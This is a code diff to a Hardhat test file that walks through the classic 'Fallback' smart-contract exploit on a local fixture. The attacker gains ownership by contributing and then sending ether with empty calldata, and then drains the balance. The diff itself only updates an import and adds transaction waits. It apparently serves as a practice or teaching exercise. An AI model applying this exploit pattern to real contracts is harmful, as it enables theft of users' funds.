@@ -1,5 +1,5 @@
 import { expect } from "chai";
-import { loadFixture } from "ethereum-waffle";
+import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
 import { ethers } from "hardhat";
 
 describe("Fallback contract exploit", () => {
@@ -14,22 +14,24 @@ describe("Fallback contract exploit", () => {
     const { deployer, attacker, fallback } = await loadFixture(deployFallbackFixture);
 
     // Add contribution to the contract
-    await fallback.connect(deployer).contribute({
+    let tx = await fallback.connect(deployer).contribute({
       value: ethers.utils.parseUnits("100", "gwei"),
     });
+    await tx.wait();
 
     // Add contribution to the contract from attacker
-    await fallback.connect(attacker).contribute({
+    tx = await fallback.connect(attacker).contribute({
       value: ethers.utils.parseUnits("1", "wei"),
     });
+    await tx.wait();
 
     // Send ether to contract without specifying msg.data
     // Since calldata is empty and msg.value contains non-zero value, this will trigger the receive function
-    const txReceipt = await attacker.sendTransaction({
+    tx = await attacker.sendTransaction({
       to: fallback.address,
       value: ethers.utils.parseUnits("1", "wei"),
     });
-    await txReceipt.wait();
+    await tx.wait();
 
     // Check that attacker is the new owner now
     const newOwner = await fallback.owner();
@@ -39,8 +41,8 @@ describe("Fallback contract exploit", () => {
     const attackerBalanceBeforeAttack = await attacker.getBalance();
 
     // Now attacker is the new owner, hence can withdraw all the ether from the contract
-    await fallback.connect(attacker).withdraw();
-
+    tx = await fallback.connect(attacker).withdraw();
+    await tx.wait();
     // Assert that contract balance is 0
     expect(await ethers.provider.getBalance(fallback.address)).to.equal("0", "Contract balance is not 0");
 
